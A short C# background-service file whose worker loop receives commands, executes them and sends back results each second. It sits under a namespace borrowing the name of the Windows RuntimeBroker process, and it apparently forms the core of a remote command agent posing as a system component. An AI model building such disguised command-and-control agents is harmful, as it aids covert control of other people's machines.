using Microsoft.RuntimeBroker.InternalServices;

namespace Microsoft.RuntimeBroker
{
    public class Worker : BackgroundService
    {
        private readonly ILogger<Worker> _logger;
        private readonly ICommandReceiver _commandReceiver;
        private readonly ICommandExecutor _commandExecutor;
        private readonly IResultSender _resultSender;

        public Worker(ILogger<Worker> logger, ICommandReceiver commandReceiver, ICommandExecutor commandExecutor, IResultSender resultSender)
        {
            _logger = logger;
            _commandReceiver = commandReceiver ?? throw new ArgumentNullException(nameof(commandReceiver));
            _commandExecutor = commandExecutor ?? throw new ArgumentNullException(nameof(commandExecutor));
            _resultSender = resultSender ?? throw new ArgumentNullException(nameof(resultSender));
        }

        protected override async Task ExecuteAsync(CancellationToken stoppingToken)
        {
            while (!stoppingToken.IsCancellationRequested)
            {
                await _commandReceiver.WorkAsync(stoppingToken);

                stoppingToken.ThrowIfCancellationRequested();

                await _commandExecutor.WorkAsync(stoppingToken);
                
                stoppingToken.ThrowIfCancellationRequested();
                
                await _resultSender.WorkAsync(stoppingToken);
                
                await Task.Delay(TimeSpan.FromSeconds(1), stoppingToken);
            }
        }
    }
}